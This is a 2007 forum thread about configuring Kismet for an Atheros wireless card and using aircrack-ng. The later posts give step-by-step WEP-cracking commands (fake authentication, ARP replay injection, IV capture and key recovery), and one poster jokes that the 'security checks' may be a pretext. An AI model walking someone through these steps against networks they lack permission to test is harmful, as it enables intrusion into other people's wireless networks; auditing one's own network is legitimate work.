---
title: "kismet with netgear wg511t"
date: 2007-06-29
forum: Networking &amp; Wireless
---

### Post by ljonesj on 2007-06-29
this card has the atheros chip were do i add the chip name in the kismet.conf file i cant remember when i did this with a card in 5.10 ubuntu it had acx10 chip in it but that was 2years ago when i done this

---

### Post by t4thfavor on 2007-06-29
add this where the #source=XXXX,XXX,XXX
source=madwifi_g,wifi0,SomeDescriptionHere

---

### Post by ljonesj on 2007-06-29
ok having problems it says i need to enable a source sending in my log and my kismet.conf file make changes and tell me what i need to get this running

---

### Post by t4thfavor on 2007-06-29
# Sources are defined as:
your sources section should look similar to this one, except mine is an abg card and yours is a bg card

# source=sourcetype,interface,name[,initialchannel]
# Source types and required drivers are listed in the README under the
# CAPTURE SOURCES section.
# The initial channel is optional, if hopping is not enabled it can be used
# to set the channel the interface listens on.
# YOU MUST CHANGE THIS TO BE THE SOURCE YOU WANT TO USE
#source=prism54g,eth2,intel
source=madwifi_ag,wifi0,atheros

Note: I have changed nothing else in the conf file.

---

### Post by ljonesj on 2007-06-29
thanks for your help and how do you get aircrack-ng to work i have no idea what to do with it and i need it for some security checks

---

### Post by t4thfavor on 2007-06-29
"Security checks" lol 
sudo airodump-ng --ivs --write something --channel 5 athX (athX is the interface placed in monitor mode)
then after you get a crapload of ivs
sudo aircrack-ng *.ivs
wait.
There is new stuff with the aircrack suite that I am not familliar with since I haven't needed to do any security checks in a while.

you may have to do 
sudo airmon-ng  start wifi0

which will tell you something to the tune of 
ath1 started

---

### Post by ljonesj on 2007-06-29
thanks my card is ath0 just need to sub that in instead of ath1

---

### Post by ljonesj on 2007-06-29
i am not getting anywhere and i am sorry for taking up your time on this here is my screenshot for this

---

### Post by database_dan on 2007-07-01
I had the same problem with Kismet myself. Then I found this wonderful tut for newbs (thats me) for airodump-ng and forgot all about Kismet.

Everything you need is here in this link...
[http://aircrack-ng.org/doku.php?id=newbie_guide&DokuWiki=849f5b01444dfe7175bc84e7df9a4bbc](http://aircrack-ng.org/doku.php?id=newbie_guide&DokuWiki=849f5b01444dfe7175bc84e7df9a4bbc)

use Synaptic to get aircrack-ng...it will also install the full "-ng" suite of programs, to ahh, perform your security checks.

eventually i got Kismet to work after watching this video...
[http://www.milw0rm.com/video/watch.php?id=1](http://www.milw0rm.com/video/watch.php?id=1)
but then realized that aircrack-ng was waaay better.

but here is what i did for Kismet using my RaLink RT2500...

```

$ sudo gedit /etc/kismet/kismet.conf
Password:

...
# Sources are defined as:
# source=sourcetype,interface,name[,initialchannel]
# Source types and required drivers are listed in the README under the
# CAPTURE SOURCES section.
# The initial channel is optional, if hopping is not enabled it can be used
# to set the channel the interface listens on.
# YOU MUST CHANGE THIS TO BE THE SOURCE YOU WANT TO USE
#source=none,none,addme
source=RaLink,ra0,RT2500
...

```


Hope this helps.
~Dan

---

### Post by tturrisi on 2007-07-01
Kismet:
```
# User to setid to (should be your normal user)
#suiduser= YOUR UBUNTU USERNAME HERE + REMOVE # AT BEGIN OF LINE

# Sources are defined as:
# source=sourcetype,interface,name[,initialchannel]
# Source types and required drivers are listed in the README under the
# CAPTURE SOURCES section.
# The initial channel is optional, if hopping is not enabled it can be used
# to set the channel the interface listens on.
# YOU MUST CHANGE THIS TO BE THE SOURCE YOU WANT TO USE
source=madwifi_ag,wifi0,madwifi
#source=acx100,wlan0,acx
#source=orinoco,eth2,hermes1
#source=rt8180,wlan0,Realtek

# OTHER SOURCES 
#source=prism54g,eth1,PrismGT
#source=hostap,wlan0,Prism2
#source=wlanng,wlan0,Prism2
#source=ipw2100,eth1,Centrino_b
#source=ipw2200,eth1,Centrino_g
#source=rt2500,ra0,Ralink_g
#source=rt2500,rausb0,Ralink_g
#source=kismet_drone,192.168.2.252:3501,kismet_drone
```

aircrack-ng:
(note: in step 2, the virtual interface will be named, it may be ath1 instead of ath0, in which case ath1 is used in all subsequent steps)
```
where xx:= ap mac & yy: = adapter mac
1. airmon-ng stop ath0
2. airmon-ng start wifi0 11
3. ifconfig ath0 up
4. aireplay-ng -1 0 -e 8724 -a xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy ath0
5. airodump-ng -c 11 --bssid xx:xx:xx:xx:xx:xx --ivs -w output ath0  (in new window)  {OR do 5b & 7b for aircrack-ptw}
5a.airodump-ng -c 11 --bssid xx:xx:xx:xx:xx:xx-w output ath0 (remove --ivs for 7b.)
6. aireplay-ng -3 -b xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy  ath0  (in new window)
7. aircrack-ng -b xx:xx:xx:xx:xx:xx output*.ivs
7b. aircrack-ptw output-01.cap
```

---

